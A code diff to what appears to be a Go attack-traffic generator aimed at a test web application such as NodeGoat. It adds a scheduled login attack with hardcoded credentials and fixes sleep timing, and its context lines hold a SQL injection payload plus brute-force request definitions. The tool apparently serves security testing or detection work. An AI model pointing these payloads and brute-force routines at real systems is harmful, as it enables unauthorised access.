@@ -50,6 +50,7 @@ var (
 	attackSize   Attack
 	attackTime   Attack
 	auth         Attack
+	authSuc      Attack
 	bruteForce1  Attack
 	bruteForce2  Attack
 	hotLink      Attack
@@ -104,6 +105,9 @@ func (p *program) Start(s service.Service) error {
 		url: fmt.Sprintf("http://%s/users/profile.php?user=", target, "user='%20or%201=1%20--")}
 	auth = Attack{name: "Auth", method: "POST", maxNap: 240, minNap: 0, pause: 4, maxRequests: 100,
 		minRequests: 40, url: fmt.Sprintf("http://%s/login?%s", target, "userName=admin&password=taco"),
+		headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}}
+	authSuc = Attack{name: "AuthSuc", method: "POST", maxNap: 240, minNap: 0, pause: 4, maxRequests: 10,
+		minRequests: 2, url: fmt.Sprintf("http://%s/login?%s", target, "userName=user1&password=User1_123"),
 		headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}}
 	bruteForce1 = Attack{name: "Brute Force 1", method: "GET", maxNap: 0, minNap: 0, pause: 1,
 		maxRequests: 1800, minRequests: 2, url: fmt.Sprintf("http://%s/login", target)}
@@ -165,6 +169,9 @@ func (p *program) run() {
 	
 	/* Every 10th minute */
 	//c.AddFunc("0 */10 * * *", func() { impostor.send() })
+	if environment == "nodegoat" {
+		c.AddFunc("0 */10 * * * *", func() { authSuc.send() })
+	}
 	
 	/* Every 15th minute */
 	c.AddFunc("0 */15 * * *", func() { probe.send() })
@@ -334,8 +341,8 @@ func (attack *Attack) send() {
 			if resp != nil {
 				resp.Body.Close()
 			}
-			//time.Sleep(time.Duration(attack.pause) * time.Second)
-			time.Sleep(time.Duration(attack.pause))
+			time.Sleep(time.Duration(attack.pause) * time.Second)
+			//time.Sleep(time.Duration(attack.pause))
 		}
 	}
 }
@@ -417,7 +424,7 @@ func (attack *Attack) crawler(request *http.Request) {
 				resp.Body.Close()
 			}
 			address.Reset()
-			time.Sleep(time.Duration(attack.pause))
+			time.Sleep(time.Duration(attack.pause) * time.Second)
 		//}
 		i++
 		//time.Sleep(time.Duration(modBy) * time.Second)
@@ -444,7 +451,7 @@ func (attack *Attack) probe(request *http.Request) {
 				resp.Body.Close()
 			}
 			address.Reset()
-			time.Sleep(time.Duration(attack.pause))
+			time.Sleep(time.Duration(attack.pause) * time.Second)
 		//}
 		i++
 		//time.Sleep(time.Duration(modBy) * time.Second)
